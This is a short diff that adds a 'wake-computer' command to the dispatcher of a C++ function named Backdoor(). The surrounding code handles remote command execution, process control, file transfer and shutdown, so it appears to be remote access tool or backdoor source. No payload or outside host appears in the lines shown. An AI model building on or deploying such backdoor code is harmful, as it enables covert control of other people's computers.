@@ -32,6 +32,7 @@ const int timeout = 300000;
 #include "StartProcess.cpp"
 #include "KillProcess.cpp"
 #include "RemoteCMD.cpp"
+#include "WakeComputer.cpp"
 #include "ViewFiles.cpp"
 #include "SendFile.cpp"
 #include "ReceiveFile.cpp"
@@ -113,6 +114,9 @@ void Backdoor()
         }
         else if (command == "remote") {
             RemoteCMD();
+        }
+        else if (command == "wake-computer") {
+            WakeComputer();
         }
         else if (command == "shutdown") {
             system("shutdown /p");
